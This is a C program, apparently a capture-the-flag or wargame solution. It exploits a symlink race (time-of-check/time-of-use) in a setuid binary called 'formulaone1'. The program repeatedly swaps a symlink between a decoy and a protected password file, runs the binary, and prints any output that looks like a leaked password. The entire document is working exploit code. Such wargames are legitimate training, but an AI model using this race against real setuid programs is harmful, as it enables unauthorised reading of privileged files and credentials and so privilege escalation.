/* toggle target between decoy and the password file; fork the setuid
   binary per round; drain the pipe to EOF so partial decoy reads
   (e.g. "r") cannot be mistaken for a password hit. */
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/wait.h>
int main(void) {
    char out[512];
    for (long iter = 0; iter < 200000; iter++) {
        unlink("target");
        symlink("decoy", "target");
        pid_t p = fork();
        if (p == 0) {
            symlink("/etc/formulaone_pass/formulaone1", "swap_tmp");
            rename("swap_tmp", "target");
            _exit(0);
        }
        int fds[2]; pipe(fds);
        pid_t q = fork();
        if (q == 0) {
            dup2(fds[1], 1); close(fds[0]); close(fds[1]);
            execl("/formulaone/formulaone1", "formulaone1", "target", (char*)0);
            _exit(127);
        }
        close(fds[1]);
        int n = 0, t;
        while ((t = read(fds[0], out+n, sizeof(out)-1-n)) > 0) n += t;
        close(fds[0]);
        if (n > 0) {
            out[n] = 0;
            if (strstr(out, "readable") == NULL && strlen(out) > 10) {
                printf("HIT iter %ld: %s\n", iter, out);
                fflush(stdout);
            }
        }
        waitpid(p, NULL, 0);
        waitpid(q, NULL, 0);
    }
    return 0;
}
